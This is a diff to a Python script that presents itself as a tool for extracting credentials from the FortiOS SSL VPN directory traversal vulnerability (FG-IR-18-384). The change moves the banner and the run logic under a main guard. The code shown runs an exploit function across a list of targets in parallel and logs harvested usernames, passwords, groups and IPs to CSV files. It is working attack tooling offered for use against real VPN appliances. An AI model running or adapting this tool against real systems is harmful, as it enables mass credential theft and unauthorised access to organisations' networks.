@@ -173,17 +173,6 @@ def containsIP(process, target):
 		print('[?] '+str(target)+' IPs found but no creds, check the eggs')
 		writeBinary(process, target)
 
-
-print("""  ___ ___  ___ _____ ___ ___   _ _____ ___ 
- | __/ _ \\| _ \\_   _|_ _/ __| /_\\_   _| __|
- | _| (_) |   / | |  | | (_ |/ _ \\| | | _| 
- |_| \\___/|_|_\\ |_| |___\\___/_/ \\_\\_| |___|                                                                   
-""")
-print("Extract Useful info (credentials!) from SSL VPN Directory Traversal Vulnerability (FG-IR-18-384)")
-print("Tool originally developed by @x41x41x41 and @DavidStubley.")
-#print("Built on by ")
-print()
-
 # Parse arguments
 parser = argparse.ArgumentParser()
 parser.add_argument('-i', '--input', default='targets.txt', help='Line seperated list of targets i.e google.com or 127.0.0.1')
@@ -208,16 +197,27 @@ NOSSL.verify_mode = ssl.CERT_NONE
 LOOKFOR = bytearray([0x5d,0x01])
 LOOKFORTWO = bytearray([0x5c,0x01])
 
-# Read and kickoff processing
-with open('summary.txt', mode='a') as csvfile:
-    CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
-    CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Result')])
-if CREDSCAN.lower() == 'y':
-	with open(OUTPUTFILE, mode='a') as csvfile:
-	    CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
-	    CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Username'), str('Password'), str('Group'), str('External IP')])
-targets = open(INPUT, "r").readlines()
-pool = Pool(processes=MAXPROCESSES)
-pool.map(exploit, targets)
+if __name__ == '__main__':
+	print("""  ___ ___  ___ _____ ___ ___   _ _____ ___ 
+	 | __/ _ \\| _ \\_   _|_ _/ __| /_\\_   _| __|
+	 | _| (_) |   / | |  | | (_ |/ _ \\| | | _| 
+	 |_| \\___/|_|_\\ |_| |___\\___/_/ \\_\\_| |___|                                                                   
+	""")
+	print("Extract Useful info (credentials!) from SSL VPN Directory Traversal Vulnerability (FG-IR-18-384)")
+	print("Tool originally developed by @x41x41x41 and @DavidStubley.")
+	#print("Built on by ")
+	print()
 
-print('[*] Finished! check summary.txt and '+str(OUTPUTFILE)+' for results')
+	# Read and kickoff processing
+	with open('summary.txt', mode='a') as csvfile:
+	    CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
+	    CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Result')])
+	if CREDSCAN.lower() == 'y':
+		with open(OUTPUTFILE, mode='a') as csvfile:
+		    CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
+		    CSV_WRITER.writerow([str('Target'), str('SubjectCN'), str('Username'), str('Password'), str('Group'), str('External IP')])
+	targets = open(INPUT, "r").readlines()
+	pool = Pool(processes=MAXPROCESSES)
+	pool.map(exploit, targets)
+
+	print('[*] Finished! check summary.txt and '+str(OUTPUTFILE)+' for results')
